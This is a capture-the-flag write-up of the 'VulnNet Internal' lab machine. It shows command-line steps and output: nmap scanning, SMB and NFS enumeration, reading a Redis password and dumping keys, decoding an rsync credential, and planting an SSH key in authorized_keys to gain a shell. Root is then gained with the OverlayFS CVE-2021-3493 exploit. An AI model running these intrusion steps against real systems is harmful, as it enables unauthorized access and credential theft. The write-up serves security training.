@@ -1,0 +1,433 @@
+VulnNet_Internal
+
+
+NMAP RESULTS:
+#############################################
+Nmap scan report for 10.10.183.132
+Host is up, received echo-reply ttl 63 (0.17s latency).
+Scanned at 2021-05-06 01:55:47 EDT for 31s
+
+PORT      STATE SERVICE     REASON         VERSION
+22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDagA3GVO7hKpJpO1Vr6+z3Y9xjoeihZFWXSrBG2MImbpPH6jk+1KyJwQpGmhMEGhGADM1LbmYf3goHku11Ttb0gbXaCt+mw1Ea+K0H00jA0ce2gBqev+PwZz0ysxCLUbYXCSv5Dd1XSa67ITSg7A6h+aRfkEVN2zrbM5xBQiQv6aBgyaAvEHqQ73nZbPdtwoIGkm7VL9DATomofcEykaXo3tmjF2vRTN614H0PpfZBteRpHoJI4uzjwXeGVOU/VZcl7EMBd/MRHdspvULJXiI476ID/ZoQLT2zQf5Q2vqI3ulMj5CB29ryxq58TVGSz/sFv1ZBPbfOl9OvuBM5BTBV
+|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNM0XfxK0hrF7d4C5DCyQGK3ml9U0y3Nhcvm6N9R+qv2iKW21CNEFjYf+ZEEi7lInOU9uP2A0HZG35kEVmuideE=
+|   256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPRO3XCBfxEo0XhViW8m/V+IlTWehTvWOyMDOWNJj+i
+111/tcp   open  rpcbind     syn-ack ttl 63 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      39576/udp6  mountd
+|   100005  1,2,3      42137/tcp6  mountd
+|   100005  1,2,3      45705/tcp   mountd
+|   100005  1,2,3      52027/udp   mountd
+|   100021  1,3,4      34352/udp   nlockmgr
+|   100021  1,3,4      37717/tcp6  nlockmgr
+|   100021  1,3,4      38621/tcp   nlockmgr
+|   100021  1,3,4      41223/udp6  nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+139/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+873/tcp   open  rsync       syn-ack ttl 63 (protocol version 31)
+2049/tcp  open  nfs_acl     syn-ack ttl 63 3 (RPC #100227)
+6379/tcp  open  redis       syn-ack ttl 63 Redis key-value store
+38621/tcp open  nlockmgr    syn-ack ttl 63 1-4 (RPC #100021)
+41515/tcp open  java-rmi    syn-ack ttl 63 Java RMI
+43159/tcp open  mountd      syn-ack ttl 63 1-3 (RPC #100005)
+45705/tcp open  mountd      syn-ack ttl 63 1-3 (RPC #100005)
+51595/tcp open  mountd      syn-ack ttl 63 1-3 (RPC #100005)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.91%E=4%D=5/6%OT=22%CT=%CU=31532%PV=Y%DS=2%DC=T%G=N%TM=60938503%P=x86_64-pc-linux-gnu)
+SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)
+OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
+WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
+ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)
+T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
+IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 42.770 days (since Wed Mar 24 07:26:48 2021)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=258 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -39m50s, deviation: 1h09m16s, median: 8s
+| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| Names:
+|   VULNNET-INTERNA<00>  Flags: <unique><active>
+|   VULNNET-INTERNA<03>  Flags: <unique><active>
+|   VULNNET-INTERNA<20>  Flags: <unique><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|   WORKGROUP<1e>        Flags: <group><active>
+| Statistics:
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 47748/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 59806/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 65124/udp): CLEAN (Failed to receive data)
+|   Check 4 (port 55054/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: vulnnet-internal
+|   NetBIOS computer name: VULNNET-INTERNAL\x00
+|   Domain name: \x00
+|   FQDN: vulnnet-internal
+|_  System time: 2021-05-06T07:56:22+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-05-06T05:56:22
+|_  start_date: N/A
+
+TRACEROUTE (using port 139/tcp)
+HOP RTT       ADDRESS
+1   158.57 ms 10.8.0.1
+2   166.95 ms 10.10.183.132
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 01:56
+Completed NSE at 01:56, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 01:56
+Completed NSE at 01:56, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 01:56
+Completed NSE at 01:56, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.57 seconds
+           Raw packets sent: 70 (4.676KB) | Rcvd: 52 (3.576KB)
+
+
+
+ENUMERATING SAMBA SHARES:
+####################################
+
+# smbclient \\\\10.10.183.132\\shares
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Feb  2 04:20:09 2021
+  ..                                  D        0  Tue Feb  2 04:28:11 2021
+  temp                                D        0  Sat Feb  6 06:45:10 2021
+  data                                D        0  Tue Feb  2 04:27:33 2021
+
+		11309648 blocks of size 1024. 3278684 blocks available
+smb: \> cd temp
+smb: \temp\> ls
+  .                                   D        0  Sat Feb  6 06:45:10 2021
+  ..                                  D        0  Tue Feb  2 04:20:09 2021
+  services.txt                        N       38  Sat Feb  6 06:45:09 2021
+
+		11309648 blocks of size 1024. 3278684 blocks available
+smb: \temp\> get services.txt 
+getting file \temp\services.txt of size 38 as services.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \temp\> cd ..
+smb: \> cd data
+smb: \data\> ls
+  .                                   D        0  Tue Feb  2 04:27:33 2021
+  ..                                  D        0  Tue Feb  2 04:20:09 2021
+  data.txt                            N       48  Tue Feb  2 04:21:18 2021
+  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021
+
+		11309648 blocks of size 1024. 3278680 blocks available
+smb: \data\> get *
+NT_STATUS_OBJECT_NAME_INVALID opening remote file \data\*
+smb: \data\> get data.txt 
+getting file \data\data.txt of size 48 as data.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \data\> get business-req.txt 
+getting file \data\business-req.txt of size 190 as business-req.txt (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \data\> 
+
+
+WE GOT THREE FILES FROM THE SHARES:
+==========================================
+
+services.txt
+data.txt
+business-req.txt
+
+
+CHECKING THESE FILES:
+===========================
+# cat business-req.txt 
+We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
+If you have any questions, please text or phone us.
+
+# cat data.txt 
+Purge regularly data that is not needed anymore
+
+# cat services.txt 
+THM{0a09d51e488f5fa105d8d866a497440a}
+
+
+#####GOT THE FIRST FLAG######
+
+LETS CHECK THE MOUNT (NFS) SHARES:
+======================================
+# showmount -e  10.10.183.132 
+Export list for 10.10.183.132:
+/opt/conf *
+
+WE FIND A SHARE, LETS MOUNT IT TO OUR LOCAL MACHINE:
+
+# mount -t nfs 10.10.183.132:/opt/conf /mnt/
+
+# ls -la
+total 72
+drwxr-xr-x  9 root root  4096 Feb  2 06:19 .
+drwxr-xr-x 19 root root 36864 May  4 10:05 ..
+drwxr-xr-x  2 root root  4096 Feb  2 04:32 hp
+drwxr-xr-x  2 root root  4096 Feb  2 04:35 init
+drwxr-xr-x  2 root root  4096 Feb  2 04:36 opt
+drwxr-xr-x  2 root root  4096 Feb  2 04:30 profile.d
+drwxr-xr-x  2 root root  4096 Feb  2 06:19 redis
+drwxr-xr-x  2 root root  4096 Feb  2 04:30 vim
+drwxr-xr-x  2 root root  4096 Feb  2 04:38 wildmidi
+
+LOTS OF DIRECTORIES TO ENUMERATE.........
+
+IN THE /redis DIRECTORTY, THE REDIS.CONF FILE CONTAINS A STRING NAMED 'requirepass' WITH CONTAINS THE PASSWORD FOR AUTHENTICATION
+
+AFTER DOWNLOADING THE REDIS-CLI, LOGGING INTO THE SERVER:
+==============================================================
+
+
+# redis-cli -h 10.10.183.132 -a 'B65Hx562F@ggAZ@F'
+Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
+10.10.183.132:6379> config get *
+  1) "dbfilename"
+  2) "dump.rdb"
+  3) "requirepass"
+  4) "B65Hx562F@ggAZ@F"
+  5) "masterauth"
+  6) ""
+  7) "cluster-announce-ip"
+  8) ""
+  9) "unixsocket"
+ 10) ""
+--[snip]--
+
+LETS CHECK THE DATABASES INDEXING USING 'INFO' COMMAND:
+--[snip]--
+
+# Keyspace
+db0:keys=5,expires=0,avg_ttl=0
+10.10.183.132:6379> select 0
+OK
+10.10.183.132:6379> keys *
+1) "authlist"
+2) "internal flag"
+3) "int"
+4) "tmp"
+5) "marketlist"
+
+SELECTING THE FIRST DATABASE, WE HAVE THE 'INTERNAL FLAG' FILE
+LETS CHECK ITS CONTENTS
+
+10.10.183.132:6379> get "internal flag"
+"THM{ff8e518addbbddb74531a724236a8221}"
+10.10.183.132:6379>
+
+#########GOT THE SECOND FLAG#########
+
+WHEN IM SEARCHING THE DATABASE:
+====================================
+10.10.212.222:6379> keys *
+1) "tmp"
+2) "int"
+3) "authlist"
+4) "marketlist"
+5) "internal flag"
+10.10.212.222:6379> get authlist
+(error) WRONGTYPE Operation against a key holding the wrong kind of value
+10.10.212.222:6379> 
+
+MAYBE THIS KEY IS CONTAINING SOME DIFFERENT TYPE OF VALUE?
+BUT, HOW WE CAN PRINT IT?
+WHAT ARE THE COMMAND USED?
+
+AFTER SEARCHING FOR THIS ERROR, I FOUND A STACKOVERFLOW ARTICLE WHICH TELLS US ABOUT THE "TYPE" OF KEYS, SO I CHECK THE TYPE:
+===============================================
+10.10.212.222:6379> type authlist
+list
+10.10.212.222:6379> 
+
+10.10.212.222:6379> type "internal flag"
+string
+10.10.212.222:6379>
+ ============================================
+
+ WE CAN SAY THAT, "GET" COMMAND IS ONLY USE WHEN THE KEY IS OF "STRING" TYPE
+
+ SO USING THE SAME ARTICLE:
+ ================================
+ Redis supports 5 data types. You need to know what type of value that a key maps to, as for each data type, the command to retrieve it is different.
+
+Here are the commands to retrieve key value:
+
+    if value is of type string -> GET <key>
+    if value is of type hash -> HGETALL <key>
+    if value is of type lists -> lrange <key> <start> <end>
+    if value is of type sets -> smembers <key>
+    if value is of type sorted sets -> ZRANGEBYSCORE <key> <min> <max>
+=====================================
+
+
+THEREFORE, WE HAVE TO USE "lrange" COMMAND FOR "LIST" TYPE KEYS:
+
+USING THIS COMMAND LIKE THIS:
+=================================
+
+10.10.212.222:6379> lrange authlist 1 1000
+1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
+2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
+3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
+
+
+THESE ARE ALL SAME BASE64 HASHES, LETS DECODE THEM
+====================================================
+
+# echo -n "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
+Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
+
+WE SOME CREDS FOR "RSYNC" SERVER
+LETS TRY TO AUTHENTICATE WITH THEM
+
+FIRST STEP:
+--------------
+# rsync rsync://rsync-connect@10.10.212.222
+files          	Necessary home interaction
+
+
+SECOND STEP:
+---------------
+# rsync rsync://rsync-connect@10.10.212.222/files
+Password: 
+drwxr-xr-x          4,096 2021/02/01 07:51:14 .
+drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal
+
+THIRD STEP:
+------------------
+# rsync rsync://rsync-connect@10.10.212.222/files/sys-internal/
+Password: 
+drwxr-xr-x          4,096 2021/02/06 07:49:29 .
+-rw-------             61 2021/02/06 07:49:28 .Xauthority
+lrwxrwxrwx              9 2021/02/01 08:33:19 .bash_history
+-rw-r--r--            220 2021/02/01 07:51:14 .bash_logout
+-rw-r--r--          3,771 2021/02/01 07:51:14 .bashrc
+-rw-r--r--             26 2021/02/01 07:53:18 .dmrc
+-rw-r--r--            807 2021/02/01 07:51:14 .profile
+lrwxrwxrwx              9 2021/02/02 09:12:29 .rediscli_history
+-rw-r--r--              0 2021/02/01 07:54:03 .sudo_as_admin_successful
+-rw-r--r--             14 2018/02/12 14:09:01 .xscreensaver
+-rw-------          2,546 2021/02/06 07:49:35 .xsession-errors
+-rw-------          2,546 2021/02/06 06:40:13 .xsession-errors.old
+-rw-------             38 2021/02/06 06:54:25 user.txt
+drwxrwxr-x          4,096 2021/02/02 04:23:00 .cache
+drwxrwxr-x          4,096 2021/02/01 07:53:57 .config
+drwx------          4,096 2021/02/01 07:53:19 .dbus
+drwx------          4,096 2021/02/01 07:53:18 .gnupg
+drwxrwxr-x          4,096 2021/02/01 07:53:22 .local
+drwx------          4,096 2021/02/01 08:37:15 .mozilla
+drwxrwxr-x          4,096 2021/02/06 06:43:14 .ssh
+drwx------          4,096 2021/02/02 06:16:16 .thumbnails
+drwx------          4,096 2021/02/01 07:53:21 Desktop
+drwxr-xr-x          4,096 2021/02/01 07:53:22 Documents
+drwxr-xr-x          4,096 2021/02/01 08:46:46 Downloads
+drwxr-xr-x          4,096 2021/02/01 07:53:22 Music
+drwxr-xr-x          4,096 2021/02/01 07:53:22 Pictures
+drwxr-xr-x          4,096 2021/02/01 07:53:22 Public
+drwxr-xr-x          4,096 2021/02/01 07:53:22 Templates
+drwxr-xr-x          4,096 2021/02/01 07:53:22 Videos
+
+
+SYS-INTERNAL IS A "USERNAME"
+
+LETS CHECK THE ".ssh" FOLDER
+EMPTY DIRECTORY, MAYBE WE CAN ADD OUR OWN KEY IN THIS DIRECTORY??
+
+
+# rsync -hv user.pub rsync://rsync-connect@10.10.212.222/files/sys-internal/.ssh/authorized_keys --inplace
+Password: 
+sending incremental file list
+user.pub
+
+sent 92 bytes  received 41 bytes  38.00 bytes/sec
+total size is 567  speedup is 4.26
+
+# rsync rsync://rsync-connect@10.10.212.222/files/sys-internal/.ssh/
+Password: 
+drwxrwxr-x          4,096 2021/05/06 07:15:57 .
+-rw-r--r--            567 2021/05/06 02:46:38 authorized_keys
+
+YES WE CAN!!
+
+NOW TRY TO SSH USING THE PRIVATE KEY:
+
+─# ssh -i user sys-internal@10.10.212.222
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+--[snip]--
+
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+sys-internal@vulnnet-internal:~$
+
+
+WE ARE IN!!
+GOT THE USER FLAG
+
+
+NOW, WE GOT TO KNOW ABOUT THE "OverlayFS_CVE-2021-3493" EXPLOIT, SO TRANSFER THE EXPLOIT TO THE REMOTE MACHINE AND EXECUTE IT:
+================================
+bash-4.4# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),1000(sys-internal)
+bash-4.4# 
+
+
+WE ARE ROOT
+GOT THE ROOT FLAG
